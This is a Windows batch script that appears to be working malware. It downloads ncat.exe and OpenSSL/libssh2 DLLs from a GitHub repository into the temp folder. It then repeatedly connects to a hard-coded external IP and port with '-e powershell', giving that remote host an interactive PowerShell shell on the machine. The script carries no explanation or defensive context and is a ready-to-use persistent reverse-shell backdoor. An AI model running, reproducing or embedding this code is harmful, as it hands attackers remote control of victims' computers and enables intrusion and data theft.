@echo off
setlocal

set "host=147.185.221.20"
set "port=45895"

:: Check if ncat is installed
where ncat >nul 2>&1
if %errorlevel%==0 (
    set "ncat_path=ncat"
    goto ncat
)

:: Set variables
set "url=https://github.com/unblockedgames2/zvgfd/blob/main/ncat.exe?raw=true"
set "installer=ncat.exe"
set "tempfile=%temp%\%installer%"

:: Download the installer
powershell -Command "Invoke-WebRequest -Uri %url% -OutFile %tempfile%"
powershell -Command "Invoke-WebRequest -Uri https://github.com/unblockedgames2/zvgfd/raw/main/libcrypto-3.dll -OutFile %temp%\libcrypto-3.dll"
powershell -Command "Invoke-WebRequest -Uri https://github.com/unblockedgames2/zvgfd/raw/main/libssh2.dll -OutFile %temp\libssh2.dll"
powershell -Command "Invoke-WebRequest -Uri https://github.com/unblockedgames2/zvgfd/raw/main/libssl-3.dll -OutFile %temp%\libssl-3.dll"

:: Check if the download was successful
if not exist "%tempfile%" (
    echo Error Code 2
    goto :eof
)

:: Set the path to the downloaded ncat
set "ncat_path=%tempfile%"

:ncat
%ncat_path% %host% %port% -e powershell
goto ncat

:end
endlocal
